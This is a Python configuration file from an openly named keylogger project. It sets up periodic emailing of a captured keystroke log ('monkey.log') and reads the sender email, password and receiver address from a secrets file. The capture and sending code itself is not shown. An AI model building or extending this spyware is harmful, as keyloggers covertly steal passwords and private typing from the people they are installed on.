# Keylogger: Capture keystrokes
#     Copyright (C) 2023  Muhammad Faizan

#     This program is free software: you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation, either version 3 of the License, or
#     (at your option) any later version.

#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#     GNU General Public License for more details.

#     You should have received a copy of the GNU General Public License
#     along with this program.  If not, see <https://www.gnu.org/licenses/>.
from os import path

class PigeonConfig:
    def __init__(self) -> None:
        self.debug = True
        self.subject = "!!LogS!!"
        self.body = "This email contains a log file."
        self.sender_email = ""
        self.password = ""
        self.receiver_email = ""
        self.filename = "monkey.log"
        self.filepath = "monkey.log"
        
    def get_secret_from_file(self, secret_file: str):
        if not path.exists(secret_file):
            Exception(FileNotFoundError)
        try:
            with open(secret_file, 'r') as file:
                lines = file.readlines()
                self.sender_email = lines[0]
                self.password = lines[1]
                self.receiver_email = lines[2]
        except:
            Exception("Error occured while reading secrets.")


class MonkeyConfig:
    def __init__(self) -> None:
        self.filepath = "monkey.log"

class AppConfig:
    def __init__(self) -> None:
        self.debug = True
        self.sender_mode = True
        self.email_frequency = 10